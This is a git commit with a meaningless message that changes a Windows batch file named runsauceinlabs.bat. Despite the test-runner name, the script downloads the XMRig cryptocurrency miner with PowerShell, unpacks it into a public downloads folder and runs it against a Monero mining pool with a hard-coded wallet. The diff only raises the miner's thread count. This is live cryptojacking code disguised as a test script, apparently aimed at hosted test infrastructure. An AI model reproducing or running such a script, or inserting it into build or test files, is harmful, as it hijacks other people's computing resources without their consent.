aa77c91bff08c898e1784edf5e4d96aed90df1c5
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-17 20:44:11 -0300

    asdklasjasdsad

--- runsauceinlabs.bat
+++ runsauceinlabs.bat
@@ -1,3 +1,3 @@
 powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
-C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnMS -p x -t 5
+C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnMS -p x -t 6
